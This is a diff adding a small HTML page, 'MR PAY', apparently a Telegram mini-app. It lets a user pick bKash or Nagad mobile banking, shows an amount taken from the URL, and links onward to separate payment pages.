@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>MR PAY</title>
+<style>
+*{box-sizing:border-box}body{margin:0;background:#eef9ff;font-family:Arial,sans-serif;color:#17212b}.page{min-height:100vh;padding:18px;display:flex;flex-direction:column}.top{height:58px;background:#fff9;border-radius:18px;display:flex;align-items:center;justify-content:space-between;padding:0 18px;box-shadow:0 3px 14px #285a7814}.top button{border:0;background:none;font-size:34px;color:#50616e}.brand{text-align:center;margin-top:34px}.logo{width:92px;height:92px;margin:auto;border-radius:50%;background:#fff;display:flex;align-items:center;justify-content:center;box-shadow:0 5px 18px #2d699124}.logo span{font-size:22px;font-weight:900;color:#147bd1;text-align:center}.brand h1{margin:12px 0 8px;font-size:23px}.details{border:0;background:#fff;color:#17658a;font-weight:700;padding:10px 21px;border-radius:22px;box-shadow:0 3px 12px #2d69911a}.title{margin-top:56px;background:#108bc6;color:#fff;border-radius:15px;text-align:center;padding:17px;font-size:20px;font-weight:700}.methods{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-top:34px}.method{height:112px;border:0;border-radius:18px;background:#fff;box-shadow:0 4px 14px #28506e1a;display:flex;align-items:center;justify-content:center}.bk{font-size:30px;color:#d81b68}.ng{font-size:27px;color:#e33a24;font-weight:800}.pay{margin-top:auto;min-height:78px;border:0;border-radius:18px;background:#d9f0fc;color:#08648d;font-size:24px;font-weight:800}.small{margin-top:10px;text-align:center;color:#6b7b86;font-size:13px}
+</style>
+</head>
+<body>
+<div class="page">
+<div class="top"><button onclick="history.back()">‹</button><button onclick="closePage()">×</button></div>
+<div class="brand"><div class="logo"><span>MR<br>PAY</span></div><h1>MR PAY</h1><button class="details">View Details</button></div>
+<div class="title">Mobile Banking</div>
+<div class="methods">
+<button class="method" onclick="location.href='bkash.html'+location.search"><span class="bk">bKash</span></button>
+<button class="method" onclick="location.href='nagad.html'+location.search"><span class="ng">Nagad</span></button>
+</div>
+<button class="pay" onclick="location.href='bkash.html'+location.search">Pay <span id="amount">100</span> BDT</button>
+<div class="small">Select a payment method to continue</div>
+</div>
+<script>
+const p=new URLSearchParams(location.search);document.getElementById('amount').textContent=p.get('amount')||'100';
+function closePage(){if(window.Telegram?.WebApp)Telegram.WebApp.close();else history.back()}
+if(window.Telegram?.WebApp){Telegram.WebApp.ready();Telegram.WebApp.expand()}
+</script>
+</body></html>
